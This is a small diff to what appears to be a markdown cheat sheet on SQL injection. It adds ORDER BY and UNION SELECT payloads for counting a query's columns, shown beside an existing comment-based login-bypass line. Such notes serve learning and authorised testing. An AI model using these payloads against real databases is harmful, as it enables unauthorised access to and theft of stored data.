@@ -73,6 +73,11 @@ Comments in sql:
    
 2. {user}'--{space}
 
+### order by   
+' order by 1...until col_eror is displayed.  
+
+### union
+gg' union select 1,2,4,...until success.
 
 
 
